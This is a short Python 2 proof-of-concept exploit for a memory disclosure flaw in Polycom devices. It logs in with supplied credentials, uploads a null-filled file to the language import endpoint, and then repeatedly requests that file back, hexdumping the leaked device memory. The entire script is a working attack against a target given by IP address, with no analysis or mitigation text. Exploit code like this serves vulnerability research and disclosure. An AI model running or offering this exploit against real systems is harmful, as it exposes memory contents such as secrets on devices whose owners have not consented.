###
# Polycom memory disclosure vulnerability
#  ./polycom.py ip username password

import base64
import socket
import string
import sys

def hexdump(src, length=16, sep='.'):
	DISPLAY = string.digits + string.letters + string.punctuation
	FILTER = ''.join(((x if x in DISPLAY else '.') for x in map(chr, range(256))))
	lines = []
	for c in xrange(0, len(src), length):
		chars = src[c:c+length]
		hex = ' '.join(["%02x" % ord(x) for x in chars])
		if len(hex) > 24:
			hex = "%s %s" % (hex[:24], hex[24:])
		printable = ''.join(["%s" % FILTER[ord(x)] for x in chars])
		lines.append("%08x:  %-*s  |%s|\n" % (c, length*3, hex, printable))
	print ''.join(lines)


ip = sys.argv[1]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "connecting to %s" % ip

try:
	s.connect((ip, 80))
except e:
	print e

username = sys.argv[2]
password = sys.argv[3]
authorization = base64.b64encode("%s:%s" % (username, password));

print "Uploading NULL file\n"

NULL = "\x00" * 65000

payload = """------WebKitFormBoundaryBuo67PfA56qM4LSt\r
Content-Disposition: form-data; name="myfile"; filename="poc.xml"\r
Content-Type: text/xml\r
\r
%s\r
------WebKitFormBoundaryBuo67PfA56qM4LSt--\r
""" % NULL

upload_msg = """POST /form-submit/Utilities/languages/importFile HTTP/1.1\r
Host: %s\r
Connection: close\r
Content-Length: %d\r
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBuo67PfA56qM4LSt\r
Cookie: Authorization=Basic %s\r
\r
%s\r
""" % (ip, len(payload), authorization, payload)

s.send(upload_msg)

data = s.recv(1024)

print "Done\n"

s.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "Memory Leak Stage\n"

leak_memory = """GET /languages?fileName=poc.xml HTTP/1.1
Host: %s
Connection: close
Cookie: Authorization=Basic %s 

""" % (ip , authorization)

s.connect((ip, 80))

print "Leaking memory:\n"

data = ""
while True:
	try:
		s.send(leak_memory)
		
		data += s.recv(1024)
	except:
		e = sys.exc_info()[0]
		print "Error: %s" %e
		break
	
hexdump(data)

print "Done\n"